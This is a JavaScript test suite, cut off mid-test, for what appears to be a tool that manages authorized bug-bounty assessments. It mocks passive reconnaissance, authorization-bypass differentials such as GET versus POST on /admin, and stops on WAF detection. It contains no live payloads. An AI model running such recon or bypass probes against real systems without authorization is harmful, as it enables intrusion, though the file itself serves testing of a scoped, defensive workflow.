import assert from "node:assert/strict";
import test from "node:test";
import * as fsPromises from "node:fs/promises";
import * as nodeOs from "node:os";
import * as nodePath from "node:path";
import http from "node:http";
import { spawnSync } from "node:child_process";
import { existsSync, rmSync } from "node:fs";
import { apply, parseTodoFeedback, srcInitialState, applySrcEvent, viewSrcState, classifyHttpRequest, SYNTHETIC_PROJECTION_EVENTS, appendSessionToolEvent } from "../lib/src.js";
import { commitSyntheticMutation, syntheticEvent } from "../lib/src/mutations.js";
import { routePlaybook, PLAYBOOK_ROUTE_KEYS } from "../lib/src/playbooks.js";
import { isJsonValue } from "@deepseek-ai/dsh-session";
/* [local.54] 凭证库隔离：全测试默认指向临时 DSH_HOME，防止 src_add_test_account / src_http 自动入库
   把测试凭据写进真实 ~/.dsh/storages/src-credentials/。需要真实路径的测试自行覆盖后恢复。 */
const __dshHomePrev = process.env.DSH_HOME;
const __dshHomeTmp = nodePath.join(nodeOs.tmpdir(), `dsh-src-test-home-${process.pid}-${Date.now()}`);
process.env.DSH_HOME = __dshHomeTmp;
process.on("exit", () => { try { rmSync(__dshHomeTmp, { recursive: true, force: true }); } catch {} });
/* [local.49] 测试会话 id 规范：harness() 每次新建独立 MemoryDomain（跨测试无共享 state，
   原 sharedDomainOpens 共享写法已废除——local.24 教训），因此 id 复用不会跨测试污染。
   仍要求：①同一测试内不同会话用不同 id；②新增 id 一律描述性命名（≥3 字符，禁止 p/x 单字符——
   排查日志/投影事件时需要可读性）。历史遗留的 "p"/"parent" 白名单豁免，文件尾元测试闸拦截新增违规。 */

class MemoryTable {
  rows = new Map();
  get(key) { return this.rows.get(key); }
  entries() { return this.rows.entries(); }
  async put(key, value) { this.rows.set(key, value); }
  async delete(key) { this.rows.delete(key); }
}

class MemoryDomain {
  tables = new Map();
  table(name) {
    if (!this.tables.has(name)) this.tables.set(name, new MemoryTable());
    return this.tables.get(name);
  }
  async close() {}
}

/* [local.54] 测试辅助：按 credentialRef 从测试隔离 DSH_HOME 的凭证库读回明文（验证 vault 往返）。 */
async function readCredentialForTest(ref) {
	const { readCredential } = await import("../lib/src/credentials.js");
	return readCredential({ dshHome: process.env.DSH_HOME, ref });
}

function harness() {
  const domain = new MemoryDomain();
  const tools = new Map();
  const sessions = new Map();
  const projections = new Map();
  const prompts = [];
  const commands = new Map();
  /* [local.34] 工具输出 schema 一致性闸：dsh 核心运行时按 additionalProperties:false 校验工具输出，
     undeclared 键直接报错（local.31 给 view 加 pendingApprovals 漏了 src_state schema 即炸）。
     测试 harness 直连 execute 不经过核心校验，所以在漏斗里补同样的闸：每个 h.run 都检查。 */
  const conformToolOutput = (name, tool, out) => {
    const schema = tool?.output?.schema;
    if (!schema || schema.additionalProperties !== false || schema.properties === void 0) return;
    if (out === null || typeof out !== "object") return;
    const declared = new Set(Object.keys(schema.properties));
    for (const key of Object.keys(out)) {
      if (!declared.has(key)) throw new Error(`[schema-gate] ${name} 输出键「${key}」未在 output schema 声明（运行时 additionalProperties:false 会报 invalid output）`);
    }
  };
  const ctx = {
    storageDomain: { open: async () => domain },
    tools: { register(tool) { tools.set(tool.name, tool); } },
    sessions: { get(id) { return sessions.get(id); } },
    subagents: { followupCalls: [], async followup(parent, sessionId, content) { this.followupCalls.push({ parent: parent.id, childSessionId: String(sessionId), content }); return `msg-${this.followupCalls.length}`; } },
    effect() {},
    inject(names, callback) {
      if (names.includes("sessionProjections")) callback({ sessionProjections: { register(spec) { projections.set(spec.key, spec); } } });
      if (names.includes("systemPrompt")) callback({ systemPrompt: { section(spec) { prompts.push(spec); } } });
      if (names.includes("commands")) callback({ commands: { register(def) { commands.set(def.name, def); } } });
    }
  };
  apply(ctx);
  const exec = (sessionId, parentSession) => {
    let s = sessions.get(sessionId);
    if (s === void 0) {
      const events = [];
      s = { events, append(type, data) { events.push({ type, data }); } };
      sessions.set(sessionId, s);
    }
    return { agent: { session: { id: sessionId, header: parentSession ? { parentSession } : {}, append: s.append } } };
  };
  const run = (name, args, execution) => {
    const tool = tools.get(name);
    const out = tool.execute(args, execution);
    /* [local.34] 全工具过 schema 闸（异步结果在 resolve 后检查）。 */
    if (out !== null && typeof out === "object" && typeof out.then === "function") {
      return out.then((v) => { conformToolOutput(name, tool, v); return v; });
    }
    conformToolOutput(name, tool, out);
    return out;
  };
  return { domain, ctx, tools, sessions, projections, prompts, commands, exec, run };
}
/* [local.26] 带 mock 审批服务的 harness：policy="allow"→返回 allowed-once，"reject"→返回 rejected。 */
function harnessWithApproval({ policy } = {}) {
  const h = harness();
  h.ctx.get = (name) => {
    if (name === "approval") return { async request() { return policy === "reject" ? "rejected" : "allowed-once"; } };
    return void 0;
  };
  return h;
}

test("SRC workflow persists, deduplicates checkpoints", async () => {
  const h = harness();
  const parentEvents = [];
  h.sessions.set("parent", { append(type, data) { parentEvents.push({ type, data }); } });
  const parent = h.exec("parent");
  const child = h.exec("child", "parent");

  const goal = await h.run("src_add_goal", { target: "https://example.test", objective: "authorized SRC assessment", authorization: "ticket-42" }, parent);
  assert.equal(goal.id, "goal-1");
  const intent = await h.run("src_add_intent", { title: "Map public endpoints", detail: "passive and low impact", goalId: goal.id }, parent);
  assert.equal(intent.id, "intent-1");

  const batch = {
    intentId: intent.id,
    facts: [{ kind: "http", target: "https://example.test", detail: "GET /health returns 200", confidence: "95%" }],
    assets: [{ type: "root-domain", value: "example.test", meta: "authorized" }],
    findings: [{ title: "Public diagnostic endpoint", severity: "low", description: "Exposes build metadata", impact: "Leaks deployment information", affectedScope: "Unauthenticated visitors to the health endpoint", remediation: "Remove build metadata from the response", pocEvidence: ["GET /health -> 200 with build field"], reproducibleSteps: ["GET /health"], victimImpact: "Unauthenticated visitors have deployment internals exposed and can be fingerprinted for targeted exploitation without awareness", attackPrerequisites: "Attacker needs only network access to the health endpoint; no authentication or user interaction required", concreteLossEvidence: ["fact-1"] }]
  };
  const firstBatch = await h.run("src_submit", { ...batch, stage: "progress", summary: "initial evidence" }, child);
  assert.deepEqual({ facts: firstBatch.facts, assets: firstBatch.assets, findings: firstBatch.findings, stage: firstBatch.stage }, { facts: 1, assets: 1, findings: 1, stage: "progress" });
  const duplicateBatch = await h.run("src_submit", { ...batch, stage: "completed", summary: "verification complete" }, child);
  assert.deepEqual({ facts: duplicateBatch.facts, assets: duplicateBatch.assets, findings: duplicateBatch.findings, stage: duplicateBatch.stage }, { facts: 0, assets: 0, findings: 0, stage: "completed" });
  const repeated = await h.run("src_submit", { ...batch, stage: "completed", summary: "verification complete" }, child);
  assert.equal(repeated.duplicateCheckpoint, true);
  /* [local.33] 改相对断言：src_add_goal 现在会多发一条域笔记快照事件，但重复 checkpoint 仍必须零新增。 */
  const eventsBeforeRepeat = parentEvents.length;
  await h.run("src_submit", { ...batch, stage: "completed", summary: "verification complete" }, child);
  assert.equal(parentEvents.length, eventsBeforeRepeat, "duplicate checkpoints must not append another projection event");

  const state = await h.run("src_state", {}, parent);
  assert.deepEqual(state.counts, { intents: 1, facts: 1, findings: 1, assets: 1, coverage: 0, research: 0, checkpoints: 2, observations: 0, userTodos: 0, pendingApprovals: 0, testAccounts: 0, domainNotes: 0 }); /* [local.65] goal 创建零机械待办 */
  assert.equal(state.intents[0].status, "completed");
  assert.equal(state.checkpoints.length, 2);
  assert.equal(state.counts.checkpoints, 2);
  const report = await h.run("src_report", {}, parent);
  assert.match(report.markdown, /子 Agent 检查点/);
});

test("goal records scope details in objective", async () => {
  const h = harness();
  const parent = h.exec("p");
  const goal = await h.run("src_add_goal", { target: "https://example.test", objective: "SRC | 已确认资产: example.test, api.example.test | 排除项: DoS", authorization: "ticket-7" }, parent);
  assert.equal(goal.id, "goal-1");
  const state = await h.run("src_state", {}, parent);
  assert.match(state.goal.objective, /api.example.test/);
  assert.match(state.goal.objective, /DoS/);
});

test("finalize engagement reports blockers and supports documented interruption", async () => {
  const h = harness();
  const parent = h.exec("p");
  await h.run("src_add_goal", { target: "example.test", objective: "test", authorization: "ticket" }, parent);
  await h.run("src_add_intent", { title: "recon", goalId: "goal-1" }, parent);
  const blocked = await h.run("src_finalize_engagement", { remainingDirections: ["扩展子域枚举"], blindSpots: [{ dimension: "http-authz-surface", status: "notApplicable" }, { dimension: "cors-headers", status: "notApplicable" }, { dimension: "dom-xhr", status: "notApplicable" }, { dimension: "dict-budget", status: "notApplicable" }, { dimension: "multi-account-cross-authz", status: "notApplicable" }] }, parent);
  assert.equal(blocked.ready, false);
  assert.ok(blocked.blockers.some((b) => /可继续推进的方向/.test(b)), "non-empty directions blocked");
  const blocked2 = await h.run("src_finalize_engagement", { remainingDirections: [], blindSpots: [{ dimension: "http-authz-surface", status: "notApplicable" }, { dimension: "cors-headers", status: "notApplicable" }, { dimension: "dom-xhr", status: "notApplicable" }, { dimension: "dict-budget", status: "notApplicable" }, { dimension: "multi-account-cross-authz", status: "notApplicable" }] }, parent);
  assert.equal(blocked2.ready, false);
  assert.match(blocked2.blockers[0], /未完成 intent/);
  const allowed = await h.run("src_finalize_engagement", { remainingDirections: [], blindSpots: [{ dimension: "http-authz-surface", status: "notApplicable" }, { dimension: "cors-headers", status: "notApplicable" }, { dimension: "dom-xhr", status: "notApplicable" }, { dimension: "dict-budget", status: "notApplicable" }, { dimension: "multi-account-cross-authz", status: "notApplicable" }], allowIncomplete: true, allowIncompleteReason: "测试用：模拟用户指示停止" }, parent);
  assert.equal(allowed.ready, true);
  assert.match(allowed.warnings.join(" "), /受限完成/);
  const stateAfter = await h.run("src_state", {}, parent);
  const decl = stateAfter.coverage.find((row) => row.phase === "report" && row.category === "受限完成声明");
  assert.notEqual(decl, void 0);
  assert.match(decl.limitation, /用户指示停止/);
});

test("asset observations, research matrix, and coverage survive state and report", async () => {
  const h = harness();
  const parent = h.exec("p");
  await h.run("src_add_goal", { target: "example.test", objective: "coverage", authorization: "ticket" }, parent);
  const intent = await h.run("src_add_intent", { title: "recon", goalId: "goal-1" }, parent);
  assert.equal(h.tools.has("src_record_asset_observation"), false);
  assert.equal(h.tools.has("src_record_recon"), false);
  const asset = await h.run("src_add_asset", { type: "subdomain", value: "api.example.test", source: "crt.sh", method: "passive", confidence: 0.9, status: "candidate" }, parent);
  assert.match(asset.id, /^asset-/);
  const research = await h.run("src_record_research", { intentId: intent.id, category: "authorization", hypothesis: "Object IDs may be cross-tenant accessible", preconditions: ["two test accounts"], status: "blocked", stopReason: "no approved second account", evidence: ["scope restriction"] }, parent);
  const coverage = await h.run("src_record_coverage", { assetId: asset.id, phase: "web", category: "authentication", status: "blocked", limitation: "WAF challenge", evidence: ["preflight 403"] }, parent);
  const state = await h.run("src_state", {}, parent);
  assert.equal(state.assets[0].source, "crt.sh");
  assert.equal(state.research[0].id, research.id);
  assert.equal(state.coverage[0].id, coverage.id);
  const report = await h.run("src_report", {}, parent);
  assert.match(report.markdown, /资产与测试覆盖率/);
  assert.match(report.markdown, /漏洞研究矩阵/);
  await h.run("src_add_asset", { type: "subdomain", value: "API.EXAMPLE.TEST", source: "DNS", method: "low-impact", confidence: 1, status: "confirmed" }, parent);
  const updated = await h.run("src_state", {}, parent);
  assert.equal(updated.assets.length, 1);
  assert.equal(updated.assets[0].status, "confirmed");
  assert.equal(updated.assets[0].confidence, 1);
});

test("finding delivery requires complete SRC report fields", async () => {
  const h = harness();
  const parent = h.exec("p");
  await h.run("src_add_goal", { target: "example.test", objective: "test", authorization: "ticket" }, parent);
  await h.run("src_add_intent", { title: "audit", goalId: "goal-1" }, parent);
  await assert.rejects(() => h.run("src_add_finding", { intentId: "intent-1", title: "incomplete", severity: "high", reproducibleSteps: ["GET /"] }, parent), /invalid arguments|impact/);
  await assert.rejects(() => h.run("src_submit", { intentId: "intent-1", facts: [], assets: [], findings: [{ title: "incomplete", severity: "high", reproducibleSteps: ["GET /"] }] }, h.exec("child", "p")), /invalid arguments|impact/);
});

test("references and child-only submission boundaries are enforced", async () => {
  const h = harness();
  const parent = h.exec("p");
  await h.run("src_add_goal", { target: "example.test", objective: "test", authorization: "ticket" }, parent);
  await assert.rejects(() => h.run("src_add_fact", { intentId: "intent-404", detail: "x" }, parent), /unknown intent/);
  await assert.rejects(() => h.run("src_submit", { intentId: "intent-1", facts: [], assets: [], findings: [] }, parent), /only available to a delegated subagent/);
  /* [local.66] 双锚点自愈后 fact 不存在退不回：store 的 unknown fact 指导性报错（不再泛泛 exactly-one-anchor） */
  await assert.rejects(() => h.run("src_add_intent", { title: "bad", goalId: "goal-1", derivedFromFactId: "fact-1" }, parent), /unknown fact/);
});

test("invalid child batches are rejected before any row is written", async () => {
  const h = harness();
  const parent = h.exec("p");
  h.sessions.set("p", { append() { throw new Error("projection must not be touched"); } });
  await h.run("src_add_goal", { target: "example.test", objective: "test", authorization: "ticket" }, parent);
  await h.run("src_add_intent", { title: "audit", goalId: "goal-1" }, parent);
  await assert.rejects(() => h.run("src_submit", {
    intentId: "intent-1",
    facts: [{ detail: "must not persist" }],
    assets: [],
    findings: [{ title: "invalid reference", severity: "high", impact: "test impact", affectedScope: "test scope", remediation: "test remediation", pocEvidence: ["test evidence"], reproducibleSteps: ["step"], affectedAssetId: "asset-404", victimImpact: "Victim accounts have their private records silently readable by third parties without any interaction or awareness", attackPrerequisites: "Attacker needs a valid low-privilege account and the ability to forge resource identifiers in requests", concreteLossEvidence: ["fact-1"] }]
  }, h.exec("child", "p")), /unknown asset/);
  const state = await h.run("src_state", {}, parent);
  assert.equal(state.counts.facts, 0);
  assert.equal(state.counts.findings, 0);
});

test("surface scanning stops before paths when protection is detected", async () => {
  const h = harness();
  const parent = h.exec("p");
  await h.run("src_add_goal", { target: "https://example.test", objective: "recon", authorization: "ticket" }, parent);
  const originalFetch = globalThis.fetch;
  try {
    globalThis.fetch = async () => new Response("Attention Required Cloudflare", { status: 403, headers: { "content-type": "text/html", server: "cloudflare" } });
    const result = await h.run("src_scan_surface", { baseUrl: "https://example.test", paths: ["/admin", "/api"], concurrency: 32, rps: 10 }, parent);
    assert.equal(result.requested, 0);
    assert.equal(result.requiresDecision, true);
    assert.equal(result.stopped, "protection-detected");
  } finally { globalThis.fetch = originalFetch; }
});

test("src_collect_passive records passive hints and coverage", async () => {
  const h = harness();
  const parent = h.exec("p");
  await h.run("src_add_goal", { target: "https://example.test", objective: "discovery", authorization: "ticket" }, parent);
  const intent = await h.run("src_add_intent", { title: "passive", goalId: "goal-1" }, parent);
  const originalFetch = globalThis.fetch;
  try {
    globalThis.fetch = async (url) => {
      const path = new URL(url).pathname;
      if (path === "/robots.txt") return new Response("Disallow: /admin\nAllow: /api\n", { status: 200, headers: { "content-type": "text/plain" } });
      if (path === "/sitemap.xml") return new Response("<urlset><url><loc>https://api.example.test/docs</loc></url></urlset>", { status: 200, headers: { "content-type": "application/xml" } });
      return new Response('<html><a href="/login">login</a><script>fetch("/graphql")</script></html>', { status: 200, headers: { "content-type": "text/html" } });
    };
    const result = await h.run("src_collect_passive", { intentId: intent.id, baseUrl: "https://example.test", hostnames: ["api.example.test"], maxHints: 10 }, parent);
    assert.equal(result.requiresDecision, false);
    const state = await h.run("src_state", {}, parent);
    assert.equal(state.coverage.some((c) => c.phase === "discovery" && c.category === "passive-collection"), true);
    assert.equal(state.facts.some((f) => /robots\.txt hint \/admin/.test(f.detail)), true);
    assert.equal(state.facts.some((f) => /interface hint \/graphql/.test(f.detail)), true);
    assert.equal(state.assets.some((a) => a.value === "api.example.test"), true);
    const report = await h.run("src_report", {}, parent);
    assert.match(report.markdown, /## API 发现摘要/);
    assert.match(report.markdown, /API\/html-js-hint/);
  } finally { globalThis.fetch = originalFetch; }
});

test("src_collect_passive promotes OpenAPI and GraphQL metadata into endpoint assets", async () => {
  const h = harness();
  const parent = h.exec("p");
  await h.run("src_add_goal", { target: "https://example.test", objective: "api-discovery", authorization: "ticket" }, parent);
  const intent = await h.run("src_add_intent", { title: "passive-api", goalId: "goal-1" }, parent);
  const originalFetch = globalThis.fetch;
  try {
    globalThis.fetch = async (url) => {
      const path = new URL(url).pathname;
      if (path === "/openapi.json") return new Response('{"openapi":"3.0.0","paths":{"/api/users":{},"/graphql":{}}}', { status: 200, headers: { "content-type": "application/json" } });
      if (path === "/graphql") return new Response('{"data":{"__schema":{"queryType":{"name":"Query"}}}}', { status: 200, headers: { "content-type": "application/json" } });
      if (path === "/robots.txt") return new Response('', { status: 200, headers: { "content-type": "text/plain" } });
      if (path === "/sitemap.xml") return new Response('', { status: 200, headers: { "content-type": "application/xml" } });
      return new Response('<html><script>fetch("/api/profile?id=1")</script></html>', { status: 200, headers: { "content-type": "text/html" } });
    };
    await h.run("src_collect_passive", { intentId: intent.id, baseUrl: "https://example.test", maxHints: 10 }, parent);
    const state = await h.run("src_state", {}, parent);
    assert.equal(state.assets.some((a) => a.type === "endpoint" && a.value === "https://example.test/openapi.json"), true);
    assert.equal(state.assets.some((a) => a.type === "endpoint" && a.value === "https://example.test/graphql"), true);
    assert.equal(state.assets.some((a) => a.type === "endpoint" && a.value === "https://example.test/api/profile?id=1"), true);
    assert.equal(state.assets.some((a) => a.type === "endpoint" && a.value === "https://example.test/api/profile"), true);
    assert.equal(state.assets.some((a) => a.type === "endpoint" && /^api:openapi-schema/.test(a.meta)), true);
    assert.equal(state.assets.some((a) => a.type === "endpoint" && /^api:graphql-endpoint/.test(a.meta)), true);
    assert.equal(state.assets.some((a) => a.type === "endpoint" && /^api:html-js-family/.test(a.meta)), true);
    assert.equal(state.apiDiscovery.total >= 4, true);
    assert.equal(state.apiDiscovery.schemas >= 1, true);
    assert.equal(state.apiDiscovery.graphql >= 1, true);
    assert.equal(state.facts.some((f) => /api schema candidate \/openapi\.json/.test(f.detail)), true);
    assert.equal(state.facts.some((f) => /graphql candidate \/graphql/.test(f.detail)), true);
    assert.equal(state.facts.some((f) => /parameter hint id/.test(f.detail)), true);
  } finally { globalThis.fetch = originalFetch; }
});

test("src_collect_passive creates planned coverage skeletons for discovered API endpoints", async () => {
  const h = harness();
  const parent = h.exec("p");
  await h.run("src_add_goal", { target: "https://example.test", objective: "api-coverage", authorization: "ticket" }, parent);
  const intent = await h.run("src_add_intent", { title: "passive-api", goalId: "goal-1" }, parent);
  const originalFetch = globalThis.fetch;
  try {
    globalThis.fetch = async (url) => {
      const path = new URL(url).pathname;
      if (path === "/openapi.json") return new Response('{"openapi":"3.0.0","paths":{"/api/users":{},"/graphql":{}}}', { status: 200, headers: { "content-type": "application/json" } });
      if (path === "/graphql") return new Response('{"data":{"__schema":{"queryType":{"name":"Query"}}}}', { status: 200, headers: { "content-type": "application/json" } });
      if (path === "/robots.txt") return new Response('', { status: 200, headers: { "content-type": "text/plain" } });
      if (path === "/sitemap.xml") return new Response('', { status: 200, headers: { "content-type": "application/xml" } });
      return new Response('<html></html>', { status: 200, headers: { "content-type": "text/html" } });
    };
    await h.run("src_collect_passive", { intentId: intent.id, baseUrl: "https://example.test" }, parent);
    const state = await h.run("src_state", {}, parent);
    const openapiAsset = state.assets.find((a) => a.value === "https://example.test/openapi.json");
    const graphqlAsset = state.assets.find((a) => a.value === "https://example.test/graphql");
    assert.equal(Boolean(openapiAsset), true);
    assert.equal(Boolean(graphqlAsset), true);
    assert.equal(state.coverage.some((c) => c.assetId === openapiAsset.id && c.category === "schema-review" && c.status === "planned"), true);
    assert.equal(state.coverage.some((c) => c.assetId === graphqlAsset.id && c.category === "graphql" && c.status === "planned"), true);
    assert.equal(state.coverage.some((c) => c.assetId === graphqlAsset.id && c.category === "authorization" && c.status === "planned"), true);
  } finally { globalThis.fetch = originalFetch; }
});

test("finalize engagement warns on discovered API endpoints with no follow-up", async () => {
  const h = harness();
  const parent = h.exec("p");
  await h.run("src_add_goal", { target: "https://example.test", objective: "api-gap", authorization: "ticket" }, parent);
  const intent = await h.run("src_add_intent", { title: "passive-api", goalId: "goal-1" }, parent);
  const originalFetch = globalThis.fetch;
  try {
    globalThis.fetch = async (url) => {
      const path = new URL(url).pathname;
      if (path === "/openapi.json") return new Response('{"openapi":"3.0.0","paths":{"/api/users":{}}}', { status: 200, headers: { "content-type": "application/json" } });
      if (path === "/robots.txt") return new Response('', { status: 200, headers: { "content-type": "text/plain" } });
      if (path === "/sitemap.xml") return new Response('', { status: 200, headers: { "content-type": "application/xml" } });
      return new Response('<html></html>', { status: 200, headers: { "content-type": "text/html" } });
    };
    await h.run("src_collect_passive", { intentId: intent.id, baseUrl: "https://example.test" }, parent);
    await h.run("src_update_intent", { intentId: intent.id, status: "completed" }, parent);
    /* [local.20] untouched/autoOnly 从 warning 升级为 blocker：不带 allowIncomplete 会被拦。 */
    const gated = await h.run("src_finalize_engagement", { remainingDirections: [], blindSpots: [{ dimension: "http-authz-surface", status: "notApplicable" }, { dimension: "cors-headers", status: "notApplicable" }, { dimension: "dom-xhr", status: "notApplicable" }, { dimension: "dict-budget", status: "notApplicable" }, { dimension: "multi-account-cross-authz", status: "notApplicable" }] }, parent);
    assert.equal(gated.ready, false);
    assert.match(gated.blockers.join(" "), /API\/接口资产尚未进入研究或覆盖推进/);
    assert.match(gated.blockers.join(" "), /仍停留在自动生成骨架/);
    assert.equal(gated.blockers.some((b) => /未完成漏洞研究假设/.test(b)), true);
    const result = await h.run("src_finalize_engagement", { remainingDirections: [], blindSpots: [{ dimension: "http-authz-surface", status: "notApplicable" }, { dimension: "cors-headers", status: "notApplicable" }, { dimension: "dom-xhr", status: "notApplicable" }, { dimension: "dict-budget", status: "notApplicable" }, { dimension: "multi-account-cross-authz", status: "notApplicable" }], allowIncomplete: true, allowIncompleteReason: "范围耗尽" }, parent);
    assert.equal(result.ready, true, "allowIncomplete bypasses the new gates");
    assert.match(result.warnings.join(" "), /已按「受限完成」处理/);
  } finally { globalThis.fetch = originalFetch; }
});

test("src_collect_passive stops on protection before collection", async () => {
  const h = harness();
  const parent = h.exec("p");
  await h.run("src_add_goal", { target: "https://example.test", objective: "discovery", authorization: "ticket" }, parent);
  const intent = await h.run("src_add_intent", { title: "passive", goalId: "goal-1" }, parent);
  const originalFetch = globalThis.fetch;
  try {
    globalThis.fetch = async () => new Response("blocked", { status: 403, headers: { "content-type": "text/html", server: "cloudflare" } });
    const result = await h.run("src_collect_passive", { intentId: intent.id, baseUrl: "https://example.test" }, parent);
    assert.equal(result.requiresDecision, true);
    const state = await h.run("src_state", {}, parent);
    assert.equal(state.coverage[0].status, "blocked");
  } finally { globalThis.fetch = originalFetch; }
});

test("src_test_bypass performs a bounded baseline→variant differential and records evidence", async () => {
  const h = harness();
  const parent = h.exec("p");
  await h.run("src_add_goal", { target: "https://example.test", objective: "bypass", authorization: "ticket" }, parent);
  const intent = await h.run("src_add_intent", { title: "authorization", goalId: "goal-1" }, parent);
  const research = await h.run("src_record_research", { intentId: intent.id, category: "method-bypass", hypothesis: "POST may bypass GET-based route authorization", preconditions: ["authorized test account"], status: "hypothesis" }, parent);
  // Baseline GET /admin → 403; POST /admin → 200. Variant differs from baseline = boundary differential.
  const originalFetch = globalThis.fetch;
  try {
    globalThis.fetch = async (url, init) => {
      const method = (init?.method ?? "GET").toUpperCase();
      if (method === "POST") return new Response("ok", { status: 200, headers: { "content-type": "application/json" } });
      return new Response("forbidden", { status: 403, headers: { "content-type": "application/json" } });
    };
    const result = await h.run("src_test_bypass", {
      intentId: intent.id, researchId: research.id, category: "method-bypass", baseUrl: "https://example.test",
      baseline: { method: "GET", path: "/admin" },
      variants: [{ method: "POST", path: "/admin", allowBody: true, rawBody: "", note: "method variant" }]
    }, parent);
    assert.equal(result.differential, true);
    assert.equal(result.requiresDecision, false);
    assert.equal(result.results.some((r) => r.phase === "baseline" && r.status === 403), true);
    assert.equal(result.results.some((r) => r.phase === "variant-1" && r.status === 200), true);
    const state = await h.run("src_state", {}, parent);
    assert.equal(state.research[0].status, "testing");
    assert.match(state.research[0].evidence.join(" "), /method-bypass/);
    assert.equal(state.coverage.some((c) => c.category === "bypass-verification"), true);
  } finally { globalThis.fetch = originalFetch; }
});

test("src_test_bypass stops on protection without commander force", async () => {
  const h = harness();
  const parent = h.exec("p");
  await h.run("src_add_goal", { target: "https://example.test", objective: "bypass", authorization: "ticket" }, parent);
  const intent = await h.run("src_add_intent", { title: "auth", goalId: "goal-1" }, parent);
  const research = await h.run("src_record_research", { intentId: intent.id, category: "authorization-bypass", hypothesis: "path normalization may change auth outcome", status: "hypothesis" }, parent);
  const originalFetch = globalThis.fetch;
  try {
    globalThis.fetch = async () => new Response("Challenge", { status: 429, headers: { "content-type": "text/html", server: "cloudflare" } });
    const result = await h.run("src_test_bypass", {
      intentId: intent.id, researchId: research.id, category: "authorization-bypass", baseUrl: "https://example.test",
      baseline: { method: "GET", path: "/" }, variants: [{ method: "GET", path: "/admin" }]
    }, parent);
    assert.equal(result.requiresDecision, true);
    assert.equal(result.differential, false);
    const state = await h.run("src_state", {}, parent);
    assert.equal(state.coverage[0].status, "blocked");
    assert.match(state.coverage[0].limitation, /protection/);
  } finally { globalThis.fetch = originalFetch; }
});

test("session state remains isolated and goal reset clears only its owner", async () => {
  const h = harness();
  for (const id of ["a", "b"]) {
    const e = h.exec(id);
    await h.run("src_add_goal", { target: `${id}.test`, objective: "test", authorization: "ticket" }, e);
    await h.run("src_add_intent", { title: `intent-${id}`, goalId: "goal-1" }, e);
  }
  await h.run("src_add_goal", { target: "a2.test", objective: "reset", authorization: "ticket" }, h.exec("a"));
  const a = await h.run("src_state", {}, h.exec("a"));
  const b = await h.run("src_state", {}, h.exec("b"));
  assert.equal(a.counts.intents, 0);
  assert.equal(b.counts.intents, 1);
  assert.equal(b.goal.target, "b.test");
});

test("projection replay mirrors semantic deduplication", () => {
  const h = harness();
  const projection = h.projections.get("src");
  const call = (state, name, args) => projection.apply(state, { type: "tool/call", data: { name, arguments: JSON.stringify(args) } });
  let state = projection.init();
  state = call(state, "src_add_goal", { target: "example.test", objective: "test", authorization: "ticket" });
  state = call(state, "src_add_intent", { title: "audit", detail: "same", goalId: "goal-1" });
  state = call(state, "src_add_intent", { title: "AUDIT", detail: "SAME", goalId: "goal-1" });
  state = call(state, "src_add_fact", { intentId: "intent-1", kind: "http", target: "EXAMPLE.TEST", detail: "HTTP 200" });
  state = call(state, "src_add_fact", { intentId: "intent-1", kind: "http", target: "example.test", detail: "http 200" });
  state = call(state, "src_add_finding", { intentId: "intent-1", title: "Leak", severity: "low", impact: "impact", affectedScope: "scope", remediation: "fix", pocEvidence: ["evidence"], reproducibleSteps: ["GET /"] });
  state = call(state, "src_add_finding", { intentId: "intent-1", title: "LEAK", severity: "high", impact: "impact", affectedScope: "scope", remediation: "fix", pocEvidence: ["evidence"], reproducibleSteps: ["GET /"] });
  state = call(state, "src_record_asset_observation", { intentId: "intent-1", type: "subdomain", value: "api.example.test", source: "crt.sh", method: "passive", confidence: 0.9, status: "candidate" });
  state = call(state, "src_record_coverage", { phase: "web", category: "auth", status: "blocked", limitation: "WAF" });
  state = call(state, "src_record_research", { intentId: "intent-1", category: "authorization", hypothesis: "cross-tenant", status: "testing" });
  const view = projection.view(state);
  assert.equal(view.assets[0].source, "crt.sh");
  assert.equal(view.coverage[0].status, "blocked");
  assert.equal(view.research[0].status, "testing");
  state = call(state, "src_test_bypass", { intentId: "intent-1", researchId: "research-1", category: "method-bypass", baseUrl: "https://example.test", baseline: { method: "GET", path: "/admin" }, variants: [{ method: "POST", path: "/admin" }] });
  state = call(state, "src_collect_passive", { intentId: "intent-1", baseUrl: "https://example.test" });
  const replayed = projection.view(state);
  assert.equal(replayed.coverage.some((c) => c.category === "bypass-verification" && c.phase === "method-bypass"), true);
  assert.equal(replayed.coverage.some((c) => c.category === "passive-collection" && c.phase === "discovery"), true);
  assert.deepEqual(replayed.counts, { intents: 1, facts: 1, findings: 1, assets: 1, coverage: 3, research: 1, checkpoints: 0, observations: 0, userTodos: 0, pendingApprovals: 0, testAccounts: 0, domainNotes: 0 });
});

test("full SRC engagement end-to-end: scope → passive → research → coverage → bypass → finalize → report", async () => {
  const h = harness();
  const parent = h.exec("p");

  // 1) scope confirmation (the formal engagement boundary)
  await h.run("src_add_goal", { target: "https://example.test", objective: "authorized SRC assessment | 已确认资产: example.test, api.example.test | 排除项: DoS | 候选证据: official website", authorization: "ticket-42" }, parent);

  // 2) commander intent + passive discovery
  const intent = await h.run("src_add_intent", { title: "api discovery", detail: "passive surface mapping", goalId: "goal-1" }, parent);
  const originalFetch = globalThis.fetch;
  try {
    globalThis.fetch = async (url) => {
      const path = new URL(url).pathname;
      if (path === "/robots.txt") return new Response("Disallow: /admin\n", { status: 200, headers: { "content-type": "text/plain" } });
      if (path === "/sitemap.xml") return new Response("", { status: 200, headers: { "content-type": "application/xml" } });
      if (path === "/openapi.json") return new Response('{"openapi":"3.0.0","paths":{"/api/users":{}}}', { status: 200, headers: { "content-type": "application/json" } });
      if (path === "/graphql") return new Response('{"data":{"__schema":{"queryType":{"name":"Query"}}}}', { status: 200, headers: { "content-type": "application/json" } });
      return new Response('<html><script>fetch("/api/profile?id=1")</script></html>', { status: 200, headers: { "content-type": "text/html" } });
    };
    const passive = await h.run("src_collect_passive", { intentId: intent.id, baseUrl: "https://example.test", maxHints: 10 }, parent);
    assert.equal(passive.requiresDecision, false);

    // 3) research hypothesis + coverage skeleton for a discovered API endpoint
    const research = await h.run("src_record_research", { intentId: intent.id, category: "authorization-bypass", hypothesis: "api users endpoint may bypass authorization", preconditions: ["authorized account"], status: "hypothesis" }, parent);
    const stateAfterPassive = await h.run("src_state", {}, parent);
    const openapiAsset = stateAfterPassive.assets.find((a) => a.value === "https://example.test/openapi.json");
    await h.run("src_record_coverage", { assetId: openapiAsset?.id, phase: "api", category: "authorization", status: "planned", evidence: ["derived from passive discovery"] }, parent);

    // 4) controlled bypass differential verification on the same hypothesis
    globalThis.fetch = async (url, init) => {
